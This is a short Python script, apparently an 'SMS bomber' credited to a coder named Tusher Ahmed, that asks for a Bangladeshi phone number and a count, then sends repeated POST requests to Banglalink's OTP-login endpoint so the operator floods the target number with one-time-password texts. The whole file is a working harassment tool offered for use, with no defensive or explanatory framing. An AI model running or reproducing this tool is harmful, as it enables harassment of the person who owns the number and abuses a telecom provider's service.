import requests
import os
import sys
"\033[1;92m"

os.system("figlet SMS ")
print("[Coder] Tusher Ahmed")

print("[FB] www.facebook.com/Tusher Ahmed")

print("\033[1;93m ^^^Only Banglalink sim^^^")


print("<------------------------------------------------>")








number=str(input("\033[1;91m[√]Enter Your Number:+88"))

amount=int(input("\033[1;92m[√]Enter Your Amount: "))

name="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
data={"mobile":number}



for i in range(amount):
	requests.post(name,data=data)
	print(str(i+1)+'SMS SEND')

